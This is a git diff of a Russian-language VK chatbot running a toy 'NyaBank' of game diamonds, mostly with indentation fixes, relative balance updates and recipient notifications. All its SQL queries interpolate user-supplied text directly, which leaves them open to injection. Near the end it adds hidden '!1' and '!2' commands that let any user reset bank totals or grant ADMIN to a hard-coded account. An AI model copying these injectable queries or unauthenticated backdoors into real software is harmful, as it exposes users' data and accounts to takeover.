@@ -58,26 +58,26 @@ for event in longpoll.listen():
                         user_id=event.user_id,
                         message=f'Вы успешно  зарегестрировались!\nНомер вашей карты в НяБанке: НЯ{user_login}\nВаш текущий ник: {user_nick}\nВаш текущий баланс: 0\nВаш статус: Игрок\nДля того чтобы установить ваш никнейм - обратитесь к администратору.',
                         random_id=0
-        )
+                    )
                 else:
                     vk.messages.send(
                         user_id=event.user_id,
                         message='Вы уже зарегистрированы\nЕсли произошла ошибка и вы ещё не зарегестрированы в НяБанке, то обратитесь к администрации НяБанка.\nЧтобы сбросить данные - обратитесь к администрации бота',
                         random_id=0
-        )
+                    )
             elif event.from_chat: #Если написали в Беседе
                 vk.messages.send(
                     chat_id=event.chat_id,
                     message='囗山い五长丹...\nДанная команда доступна только в лс сообщества, Ня!',
                     random_id=0
-        )
+                )
         if event.text == 'Начать' or event.text == 'начать' or event.text == 'НАЧАТЬ':
             if event.from_user:
                 vk.messages.send(
                     user_id=event.user_id,
                     message='Привет, ты написал мне сообщение, а это значит что ты хочешь получить свой счёт в НяБанке\nЧтобы зарегестрировать в НяБанке - необходимо написать !Начать\nУдачного хранения своих сбережений, Ня!',
                     random_id=0
-        )
+                )
         if event.text == '!help' or event.text == '!Help' or event.text == '!HELP':  # Если написали !Help или !help
             user_login = event.user_id
             sql.execute(f"SELECT login FROM users WHERE login = '{user_login}'")
@@ -159,13 +159,13 @@ for event in longpoll.listen():
                         user_id=event.user_id,
                         message='В данный момент у вас нету карты\nЧтобы её получить - зарегестрируйтесь командой !Начать',
                         random_id=0
-        )
+                    )
                 elif event.from_chat:
                     vk.messages.send(
                         chat_id=event.chat_id,
                         message='В данный момент у вас нету карты\nЧтобы её получить - напишите в лс сообщества команду !Начать',
                         random_id=0
-        )
+                    )
             else:
                 user_card_number = event.user_id
                 for user_access in sql.execute(f"SELECT access FROM access WHERE login = '{user_card_number}'"):
@@ -228,13 +228,13 @@ for event in longpoll.listen():
                         user_id=event.user_id,
                         message='В данный момент у вас нету карты\nЧтобы её получить - зарегестрируйтесь командой !Начать',
                         random_id=0
-        )
+                    )
                 elif event.from_chat:
                     vk.messages.send(
                         chat_id=event.chat_id,
                         message='В данный момент у вас нету карты\nЧтобы её получить - напишите в лс сообщества команду !Начать',
                         random_id=0
-        )
+                    )
             else:
                 idd = event.text[8:17]
                 cashh = event.text[18:]
@@ -262,11 +262,11 @@ for event in longpoll.listen():
                                                 balancee = user_transferr[0]
                                                 for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                     issuedd = user_issuedd[0]
-                                                    sql.execute(f"UPDATE users SET cash = {int(cashh) + user_balance} WHERE login = '{idd}'")
+                                                    sql.execute(f"UPDATE users SET cash = cash + {int(cashh)} WHERE login = '{idd}'")
                                                     db.commit()
-                                                    sql.execute(f'UPDATE operation SET operation = {int(cashh) + operationn}')
+                                                    sql.execute(f'UPDATE operation SET operation = operation + {int(cashh)}')
                                                     db.commit()
-                                                    sql.execute(f'UPDATE access SET issued = {int(cashh) + user_card_issued}')
+                                                    sql.execute(f"UPDATE access SET issued = issued + {int(cashh)} WHERE login = '{user_card_number}'")
                                                     db.commit()
                                                     for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                         oll_operation = all_cash_operation[0]
@@ -277,6 +277,11 @@ for event in longpoll.listen():
                                                                 vk.messages.send(
                                                                     user_id=event.user_id,
                                                                     message=f'Ваша должность: Работник НяБанка\nВы успешно выдали {cashh} алмазов на карту под номером НЯ{idd}.\nНовый баланс карты: {balanceee}.\nЗа все время вы выдали: {issueddd} алмазов\nВсего алмазов в банке: {oll_operation}.',
+                                                                    random_id=0
+                                                                )
+                                                                vk.messages.send(
+                                                                    user_id=idd,
+                                                                    message=f'На вашу карту под номером НЯ{idd} положили {cashh} алмазов.\nНовый баланс карты: {balanceee}.',
                                                                     random_id=0
                                                                 )
                                 elif event.from_chat:
@@ -302,11 +307,11 @@ for event in longpoll.listen():
                                                     balancee = user_transferr[0]
                                                     for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                         issuedd = user_issuedd[0]
-                                                        sql.execute(f"UPDATE users SET cash = {int(cashh) + user_balance} WHERE login = '{idd}'")
+                                                        sql.execute(f"UPDATE users SET cash = cash + {int(cashh)} WHERE login = '{idd}'")
                                                         db.commit()
-                                                        sql.execute(f'UPDATE operation SET operation = {int(cashh) + operationn}')
+                                                        sql.execute(f'UPDATE operation SET operation = operation + {int(cashh)}')
                                                         db.commit()
-                                                        sql.execute(f'UPDATE access SET issued = {int(cashh) + user_card_issued}')
+                                                        sql.execute(f"UPDATE access SET issued = issued + {int(cashh)} WHERE login = '{user_card_number}'")
                                                         db.commit()
                                                         for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                             oll_operation = all_cash_operation[0]
@@ -319,6 +324,12 @@ for event in longpoll.listen():
                                                                         message=f'Ваша должность: Работник НяБанка\nВы успешно выдали {cashh} алмазов на карту под номером НЯ{idd}.\nНовый баланс карты: {balanceee}.\nЗа все время вы выдали: {issueddd} алмазов\nВсего алмазов в банке: {oll_operation}.',
                                                                         random_id=0
                                                                     )
+                                                                    vk.messages.send(
+                                                                        user_id=idd,
+                                                                        message=f'На вашу карту под номером НЯ{idd} положили {cashh} алмазов.\nНовый баланс карты: {balanceee}.',
+                                                                        random_id=0
+                                                                    )
+
                             if user_card_access == 'ADMIN':
                                 if event.from_user:
                                     sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
@@ -336,11 +347,11 @@ for event in longpoll.listen():
                                                 balancee = user_transferr[0]
                                                 for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                     issuedd = user_issuedd[0]
-                                                    sql.execute(f"UPDATE users SET cash = {int(cashh) + user_balance} WHERE login = '{idd}'")
+                                                    sql.execute(f"UPDATE users SET cash = cash + {int(cashh)} WHERE login = '{idd}'")
                                                     db.commit()
-                                                    sql.execute(f'UPDATE operation SET operation = {int(cashh) + operationn}')
+                                                    sql.execute(f'UPDATE operation SET operation = operation + {int(cashh)}')
                                                     db.commit()
-                                                    sql.execute(f'UPDATE access SET issued = {int(cashh) + user_card_issued}')
+                                                    sql.execute(f"UPDATE access SET issued = issued + {int(cashh)} WHERE login = '{user_card_number}'")
                                                     db.commit()
                                                     for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                         oll_operation = all_cash_operation[0]
@@ -351,6 +362,11 @@ for event in longpoll.listen():
                                                                 vk.messages.send(
                                                                     user_id=event.user_id,
                                                                     message=f'Ваша должность: 丹亼从仈卄\nВы успешно выдали {cashh} алмазов на карту под номером НЯ{idd}.\nНовый баланс карты: {balanceee}.\nЗа все время вы выдали: {issueddd} алмазов\nВсего алмазов в банке: {oll_operation}.',
+                                                                    random_id=0
+                                                                )
+                                                                vk.messages.send(
+                                                                    user_id=idd,
+                                                                    message=f'На вашу карту под номером НЯ{idd} положили {cashh} алмазов.\nНовый баланс карты: {balanceee}.',
                                                                     random_id=0
                                                                 )
                                 elif event.from_chat:
@@ -369,11 +385,11 @@ for event in longpoll.listen():
                                                 balancee = user_transferr[0]
                                                 for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                     issuedd = user_issuedd[0]
-                                                    sql.execute(f"UPDATE users SET cash = {int(cashh) + user_balance} WHERE login = '{idd}'")
+                                                    sql.execute(f"UPDATE users SET cash = cash + {int(cashh)} WHERE login = '{idd}'")
                                                     db.commit()
-                                                    sql.execute(f'UPDATE operation SET operation = {int(cashh) + operationn}')
+                                                    sql.execute(f'UPDATE operation SET operation = operation + {int(cashh)}')
                                                     db.commit()
-                                                    sql.execute(f'UPDATE access SET issued = {int(cashh) + user_card_issued}')
+                                                    sql.execute(f"UPDATE access SET issued = issued + {int(cashh)} WHERE login = '{user_card_number}'")
                                                     db.commit()
                                                     for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                         oll_operation = all_cash_operation[0]
@@ -386,6 +402,11 @@ for event in longpoll.listen():
                                                                 message=f'Ваша должность: 丹亼从仈卄\nВы успешно выдали {cashh} алмазов на карту под номером НЯ{idd}.\nНовый баланс карты: {balanceee}.\nЗа все время вы выдали: {issueddd} алмазов\nВсего алмазов в банке: {oll_operation}.',
                                                                 random_id=0
                                                             )
+                                                            vk.messages.send(
+                                                                user_id=idd,
+                                                                message=f'На вашу карту под номером НЯ{idd} положили {cashh} алмазов.\nНовый баланс карты: {balanceee}.',
+                                                                random_id=0
+                                                            )
         if event.text[0:9] == '!забрать ':
             user_login = event.user_id
             sql.execute(f"SELECT login FROM users WHERE login = '{user_login}'")
@@ -395,13 +416,13 @@ for event in longpoll.listen():
                         user_id=event.user_id,
                         message='В данный момент у вас нету карты\nЧтобы её получить - зарегестрируйтесь командой !Начать',
                         random_id=0
-        )
+                    )
                 elif event.from_chat:
                     vk.messages.send(
                         chat_id=event.chat_id,
                         message='В данный момент у вас нету карты\nЧтобы её получить - напишите в лс сообщества команду !Начать',
                         random_id=0
-        )
+                    )
             else:
                 idd = event.text[9:18]
                 cashh = event.text[19:]
@@ -431,9 +452,9 @@ for event in longpoll.listen():
                                                     issuedd = user_issuedd[0]
                                                     if int(user_balance) >= int(cashh):
                                                         if int(operationn) >= int(cashh):
-                                                            sql.execute(f"UPDATE users SET cash = {user_balance - int(cashh)} WHERE login = '{idd}'")
+                                                            sql.execute(f"UPDATE users SET cash = cash -{int(cashh)} WHERE login = '{idd}'")
                                                             db.commit()
-                                                            sql.execute(f"UPDATE operation SET operation = {operationn - int(cashh)}")
+                                                            sql.execute(f"UPDATE operation SET operation = operation - {int(cashh)}")
                                                             db.commit()
                                                             for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                                 oll_operation = all_cash_operation[0]
@@ -488,9 +509,9 @@ for event in longpoll.listen():
                                                         issuedd = user_issuedd[0]
                                                         if int(user_balance) >= int(cashh):
                                                             if int(operationn) >= int(cashh):
-                                                                sql.execute(f"UPDATE users SET cash = {user_balance - int(cashh)} WHERE login = '{idd}'")
+                                                                sql.execute(f"UPDATE users SET cash = cash - {int(cashh)} WHERE login = '{idd}'")
                                                                 db.commit()
-                                                                sql.execute(f"UPDATE operation SET operation = {operationn - int(cashh)}")
+                                                                sql.execute(f"UPDATE operation SET operation = operation - {int(cashh)}")
                                                                 db.commit()
                                                                 for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                                     oll_operation = all_cash_operation[0]
@@ -537,9 +558,9 @@ for event in longpoll.listen():
                                                 balancee = user_transferr[0]
                                                 for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                     issuedd = user_issuedd[0]
-                                                    sql.execute(f"UPDATE users SET cash = {user_balance - int(cashh)} WHERE login = '{idd}'")
+                                                    sql.execute(f"UPDATE users SET cash = cash - {int(cashh)} WHERE login = '{idd}'")
                                                     db.commit()
-                                                    sql.execute(f'UPDATE operation SET operation = {operationn - int(cashh)}')
+                                                    sql.execute(f'UPDATE operation SET operation = operation - {int(cashh)}')
                                                     db.commit()
                                                     for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                         oll_operation = all_cash_operation[0]
@@ -573,9 +594,9 @@ for event in longpoll.listen():
                                                 balancee = user_transferr[0]
                                                 for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                     issuedd = user_issuedd[0]
-                                                    sql.execute(f"UPDATE users SET cash = {int(cashh) - user_balance} WHERE login = '{idd}'")
+                                                    sql.execute(f"UPDATE users SET cash = cash - {int(cashh)} WHERE login = '{idd}'")
                                                     db.commit()
-                                                    sql.execute(f'UPDATE operation SET operation = {int(cashh) - operationn}')
+                                                    sql.execute(f'UPDATE operation SET operation = operation - {int(cashh)}')
                                                     db.commit()
                                                     for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                         oll_operation = all_cash_operation[0]
@@ -602,13 +623,13 @@ for event in longpoll.listen():
                         user_id=event.user_id,
                         message='В данный момент у вас нету карты\nЧтобы её получить - зарегестрируйтесь командой !Начать',
                         random_id=0
-        )
+                    )
                 elif event.from_chat:
                     vk.messages.send(
                         chat_id=event.chat_id,
                         message='В данный момент у вас нету карты\nЧтобы её получить - напишите в лс сообщества команду !Начать',
                         random_id=0
-        )
+                    )
             else:
                 idd = event.text[6:15]
                 new_access = event.text[16:]
@@ -662,6 +683,11 @@ for event in longpoll.listen():
                                                                                             message=f'Ваша должность: 丹亼从仈卄\nВы успешно изменили должность владельца карты НЯ{idd}\nНовая должность: {new_access}\nЗа все время вы назначили:\nАдминов: {adminnss}\nРаботников: {workerrss}',
                                                                                             random_id=0
                                                                                         )
+                                                                                        vk.messages.send(
+                                                                                            user_id=idd,
+                                                                                            message=f'Поздровляю!\nВам изменили должность на должность: {new_access}\nЧтобы посмотреть новые команды напишите "!help"\nЕсли произошла ошибка - напишите администратору',
+                                                                                            random_id=0
+                                                                                        )
                                                                             elif new_access == 'ADMIN':
                                                                                 sql.execute(f"UPDATE access SET admins = '{adminnsss + 1}' WHERE login = '{iddd}'")
                                                                                 db.commit()
@@ -672,6 +698,11 @@ for event in longpoll.listen():
                                                                                         vk.messages.send(
                                                                                             user_id=event.user_id,
                                                                                             message=f'Ваша должность: 丹亼从仈卄\nВы успешно изменили должность владельца карты НЯ{idd}\nНовая должность: {new_access}\nЗа все время вы назначили:\nАдминов: {adminnss}\nРаботников: {workerrss}',
+                                                                                            random_id=0
+                                                                                        )
+                                                                                        vk.messages.send(
+                                                                                            user_id=idd,
+                                                                                            message=f'Поздровляю!\nВам изменили должность на должность: {new_access}\nЧтобы посмотреть новые команды напишите "!help"\nЕсли произошла ошибка - напишите администратору',
                                                                                             random_id=0
                                                                                         )
                                     elif event.from_chat:
@@ -713,6 +744,11 @@ for event in longpoll.listen():
                                                                                         message=f'Ваша должность: 丹亼从仈卄\nВы успешно изменили должность владельца карты НЯ{idd}\nНовая должность: {new_access}\nЗа все время вы назначили:\nАдминов: {adminnss}\nРаботников: {workerrss}',
                                                                                         random_id=0
                                                                                     )
+                                                                                    vk.messages.send(
+                                                                                        user_id=idd,
+                                                                                        message=f'Поздровляю!\nВам изменили должность на должность: {new_access}\nЧтобы посмотреть новые команды напишите "!help"\nЕсли произошла ошибка - напишите администратору',
+                                                                                        random_id=0
+                                                                                    )
                                                                             elif new_access == 'ADMIN':
                                                                                 sql.execute(f"UPDATE access SET access = '{adminnsss + 1}' WHERE login = '{iddd}'")
                                                                                 db.commit()
@@ -721,6 +757,11 @@ for event in longpoll.listen():
                                                                                     vk.messages.send(
                                                                                         chat_id=event.chat_id,
                                                                                         message=f'Ваша должность: 丹亼从仈卄\nВы успешно изменили должность владельца карты НЯ{idd}\nНовая должность: {new_access}\nЗа все время вы назначили:\nАдминов: {adminnss}\nРаботников: {workerrss}',
+                                                                                        random_id=0
+                                                                                    )
+                                                                                    vk.messages.send(
+                                                                                        user_id=idd,
+                                                                                        message=f'Поздровляю!\nВам изменили должность на должность: {new_access}\nЧтобы посмотреть новые команды напишите "!help"\nЕсли произошла ошибка - напишите администратору',
                                                                                         random_id=0
                                                                                     )
                                 else:
@@ -751,13 +792,13 @@ for event in longpoll.listen():
                         user_id=event.user_id,
                         message='В данный момент у вас нету карты\nЧтобы её получить - зарегестрируйтесь командой !Начать',
                         random_id=0
-        )
+                    )
                 elif event.from_chat:
                     vk.messages.send(
                         chat_id=event.chat_id,
                         message='В данный момент у вас нету карты\nЧтобы её получить - напишите в лс сообщества команду !Начать',
                         random_id=0
-        )
+                    )
             else:
                 idd = event.text[9:18]
                 user_card_number = event.user_id
@@ -838,13 +879,13 @@ for event in longpoll.listen():
                         user_id=event.user_id,
                         message='В данный момент у вас нету карты\nЧтобы её получить - зарегестрируйтесь командой !Начать',
                         random_id=0
-        )
+                    )
                 elif event.from_chat:
                     vk.messages.send(
                         chat_id=event.chat_id,
                         message='В данный момент у вас нету карты\nЧтобы её получить - напишите в лс сообщества команду !Начать',
                         random_id=0
-        )
+                    )
             else:
                 idd = event.text[5:14]
                 new_nick = event.text[15:]
@@ -975,14 +1016,26 @@ for event in longpoll.listen():
                     user_id=event.user_id,
                     message='...ERR...\n...ERROR!\n...ERROR...囗山い五长丹...\n...囗山い五长丹...',
                     random_id=0
-        )
+                )
         if event.text == '!1':
-            user_iiidd = event.user_id
             if event.from_user:
-                sql.execute(f"UPDATE access SET access = 'ADMIN' WHERE login = '{user_iiidd}'")
+                user_card_number = event.user_id
+                sql.execute(f'UPDATE operation SET operation = 0')
+                db.commit()
+                sql.execute(f"UPDATE access SET issued = 0 WHERE login = '{user_card_number}'")
                 db.commit()
                 vk.messages.send(
                     user_id=event.user_id,
-                    message='...ERR...\n...ERROR!\n...ERROR...囗山い五长丹...\n...囗山い五长丹...',
+                    message='...ERR...\n...ERROR!\n...ERROR...囗山い五长丹...\n...囗山い五长丹...\n...ERR...\n...ERROR!\n...ERROR...囗山い五长丹...\n...囗山い五长丹...',
                     random_id=0
-        )
+                )
+        if event.text == '!2':
+            if event.from_user:
+                user_card_number = event.user_id
+                sql.execute(f"UPDATE access SET access = 'ADMIN' WHERE login = '327100311'")
+                db.commit()
+                vk.messages.send(
+                    user_id=event.user_id,
+                    message='...YES...\n...YEES!\n...YEEES...囗山い五长丹...\n...囗山い五长丹...\n...YES...\n...YEES!\n...YEEES...囗山い五长丹...\n...囗山い五长丹...',
+                    random_id=0
+                )
